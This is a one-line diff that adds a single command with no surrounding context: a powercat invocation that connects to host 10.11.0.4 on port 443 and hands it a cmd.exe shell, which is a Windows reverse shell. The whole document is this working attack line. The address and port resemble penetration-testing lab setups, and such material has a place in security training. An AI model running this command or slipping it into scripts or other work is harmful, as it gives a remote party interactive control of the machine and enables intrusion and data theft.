@@ -1,0 +1,1 @@
+powercat -c 10.11.0.4 -p 443 -e cmd.exe
